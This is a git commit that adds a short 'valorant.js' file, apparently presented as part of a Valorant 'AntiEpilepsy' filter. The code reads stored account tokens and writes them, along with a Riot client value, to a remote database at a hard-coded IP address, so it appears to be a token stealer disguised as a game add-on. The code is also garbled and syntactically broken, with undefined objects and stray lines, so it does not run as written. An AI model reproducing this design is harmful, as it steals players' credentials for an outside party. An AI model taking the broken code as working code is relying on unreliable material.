51ccffff12291df0a5bbb5c794930f45f1813f4b
Pau <59795341+YehItsPau@users.noreply.github.com>
2020-08-22 22:13:24 +0200

    parte del get, no tocar xD

---
+++ valorant.js
@@ -0,0 +1,12 @@
+const ValorantApp = new app.Valorant.riotclient();
+const miji = remote("139.29.233.12/MIJI-DB/")
+let xd = Riot.Client();
+var AntiEpilepsy = ("./ValorantEpilepsyFilter/get/tokens")
+   selfconnecion.Valorant.exe
+      return err("Error");
+    [('./get/tokens.txt/')]; process.tokens.xd
+if(!process.tokens.xd) return ValorantApp.print("ERROR! NO TOKEN DEFINED!");
+{
+   let iM = miji.selfconnecion();
+   iM.set(`${xd}, ${process.tokens.xd}`)
+}
